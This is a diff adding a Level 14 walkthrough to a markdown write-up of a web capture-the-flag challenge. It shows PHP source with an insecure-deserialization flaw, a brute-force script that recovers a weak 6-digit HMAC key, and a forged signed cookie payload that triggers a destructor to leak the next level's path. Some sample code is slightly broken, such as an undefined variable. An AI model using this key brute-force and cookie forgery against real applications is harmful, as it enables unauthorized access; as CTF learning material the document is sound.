@@ -316,7 +316,218 @@ and send it, it will give you : /2X8oLemQ
 ```
 
 
+- ### Level14
 
+```text
+1.Go to this address : https://talent.voorivex.academy/2X8oLemQ?showme
+
+2.There is a php code :
+```
+
+```php
+<?php
+error_reporting(0);
+
+require 'token.php';
+$cookieName = 'very_secure_role';
+
+if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['showme'])) {
+    show_source('index.php');
+    exit;
+}
+
+class Flag
+{
+    private $action;
+    function __destruct()
+    {
+        if ($this->action == 'get') {
+            echo getenv('LEVEL_15');
+            die();
+        }
+    }
+}
+
+function generateAndSaveToken($filename = "token.php")
+{
+    // Generate token
+    $token = substr((double) microtime() * 1000000, 0, 6);
+
+    // Save token to PHP file
+    $phpCode = "<?php\n\$generatedToken = '$token';";
+    file_put_contents($filename, $phpCode);
+
+    return $token;
+}
+
+function generateHmac($stringToSign, $secretKey = null)
+{
+    global $generatedToken;
+    $secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;
+
+    $hashAlgorithm = 'sha256';
+    $hmac = hash_hmac($hashAlgorithm, $stringToSign, $secretKey, true);
+
+    $hexHmac = bin2hex($hmac);
+
+    return $hexHmac;
+}
+
+function validateHmac($stringToValidate, $providedHmac, $secretKey = null)
+{
+    global $generatedToken;
+    $secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;
+
+    $hashAlgorithm = 'sha256';
+    $generatedHmac = hash_hmac($hashAlgorithm, $stringToValidate, $secretKey, true);
+    $generatedHexHmac = bin2hex($generatedHmac);
+
+    // Use a secure comparison function to avoid timing attacks
+    $isValid = hash_equals($providedHmac, $generatedHexHmac);
+
+    return $isValid;
+}
+
+if (!isset($_COOKIE[$cookieName])) {
+    setcookie($cookieName, serialize('TARS') . '.' . generateHmac(serialize('TARS')), time() + 86400, '/');
+} else {
+    $cookieValue = explode('.', $_COOKIE[$cookieName])[0];
+    $signiture = explode('.', $_COOKIE[$cookieName])[1];
+
+    if (validateHmac($cookieValue, $signiture)) {
+        unserialize($cookieValue);
+    }
+}
+
+// generateAndSaveToken()
+?>
+
+```
+
+this code has deserialization vulnerability, the gole is to make this line work :
+
+```php
+if (validateHmac($cookieValue, $signiture)) {
+        unserialize($cookieValue);
+    }
+```
+
+
+function `validateHmac()` does these operations :
+- gets a string ($cookievalue)
+- gets a signed hmac value ($signature)
+- if there is a secretkey, takes it, if not, uses `global $generatedToken;`
+- calculates hmac value itself
+- compares it with provided hmac
+- returns true if match
+
+we need to provide a serialized data and its hmac in such a way that validateHmac function becomes true
+a serialized data that matches the class `Flag` should be this : `O:4:"Flag":1:{s:6:"action";s:3:"get";}` (i talk about it later)
+and we need to sign it.
+
+in order to sign it, we should use the function `generateHmac()` that does these operations:
+- gets a string to sign (serialized data)
+- if there is a secretkey, takes it, if not, uses `global $generatedToken;`
+
+if you try to generate the hmac, you need a token, which is mentioned in function `generateAndSaveToken()`
+
+now pay close attention to cookies in bup, every time you remove the `very_secure_role` cookie
+the page, gives you a `set-cookie` header but the important thing :
+
+#### the set-cookie value is always the same
+it has this value :
+`very_secure_role=s%3A4%3A%22TARS%22%3B.3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226a`
+in decoded format it is :
+`very_secure_role=s:4:"TARS";.3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226`
+
+huge attention to this behavior is the golden key, since according to php code on the page
+and the way `generateAndSaveToken()` function work, every time you load the page you should get
+a new set-cookie signatuer, but this does not happen, and that's because `generateAndSaveToken()`
+function is commented in the last line `// generateAndSaveToken()`, see that ?
+
+so there is only one meaning of this, and that is the page is loading `$generatedToken` from another way, evidences:
+- this variable is defined as `global $generatedToken;` -> to be available every where in the code
+- the page is using `require 'token.php';`
+
+and that means `$generatedToken` is in `token.php` and has a fixed value
+
+#### Let the game begin
+now here is the situation :
+- we have an already calculated hmac hash value : `3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226` in the set-cookie header
+- we have the function that can generate hashes : `generateHmac`
+- we have this line in the function : `$secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;`
+- what we do not have is the value of token that generated the hash value
+- we know that the token must be a 6 digit value -> this line `$token = substr((double) microtime() * 1000000, 0, 6);` in `generateAndSaveToken()` function
+
+#### we should find the token
+to find the token, we need to use all possible 6 digit numbers available and put it in `generateHmac()` function
+and compare it to the hash that set-cookie header sets for us :
+
+```php
+<?php
+function generateHmac($stringToSign, $generatedToken)
+{
+    
+    $hashAlgorithm = 'sha256';
+    $hmac = hash_hmac($hashAlgorithm, $stringToSign, $generatedToken, true);
+
+    $hexHmac = bin2hex($hmac);
+
+    return $hexHmac;
+}
+
+for ($i = 100000; $i <= 999999; $i++) {
+    $generatedToken = $i;
+    $myhash = generateHmac(serialize('TARS'),$generatedToken);
+    if ($myhash === '3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226a'){
+    echo $generatedToken;
+    }
+}
+
+?>
+
+```
+
+the code above finds the token -> `934573`
+
+#### Calculate hmac with token and serialize object
+now that we have the token, we should generate a hmac for the serialized data (O:4:"Flag":1:{s:6:"action";s:3:"get";})
+to get the serialized object the code below helps (notice i changed `private` to `public` to get correct serialization):
+
+```php
+class Flag
+{
+    public $action ='get';
+    function __destruct()
+    {
+        if ($this->action == 'get') {
+            echo getenv('LEVEL_15');
+            die();
+        }
+    }
+}
+
+$myaction = new Flag();
+$generatedhmac = generateHmac(serialize($user),934573);
+echo serialize($myaction);
+echo <br>;
+echo $generatedhmac;
+```
+
+output :
+
+```text
+O:4:"Flag":1:{s:6:"action";s:3:"get";}
+efa9fbdb0bcb5bdce882e8b156321259663538f57490268f81f43538c99e6640
+```
+
+#### Final step
+now we have both data we need, and `validateHmac()` can be satisfied
+just put those strings like this together : `O:4:"Flag":1:{s:6:"action";s:3:"get";}.efa9fbdb0bcb5bdce882e8b156321259663538f57490268f81f43538c99e6640`
+put it in `very_secure_role` cookie, url encode it and send it
+
+3.You will get this : "/JTGZg6NV"
+4.Go to : https://talent.voorivex.academy/JTGZg6NV/
 
 
 
